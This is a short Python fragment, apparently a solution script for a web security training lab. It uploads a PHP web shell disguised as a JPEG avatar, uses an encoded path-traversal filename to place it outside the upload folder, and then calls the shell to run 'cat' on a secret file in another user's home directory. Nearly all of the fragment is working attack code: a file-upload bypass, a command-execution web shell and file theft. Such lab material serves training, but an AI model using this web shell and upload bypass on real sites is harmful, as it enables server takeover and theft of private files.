...
def upload_web_shell(url:str, s:requests.Session):
    ...
    # / needs to be url encoded => %2f 
    params = {'avatar': ('..%2f2.php', "<?php echo system($_GET['command']); ?>", 'image/jpeg'),
              'user': 'wiener',
              'csrf': csrf}
    ...
    # The script is in /files/ directory 
    req = s.get(url + '/files/2.php?command=' + 'cat /home/carlos/secret', verify=False, proxies=proxies)
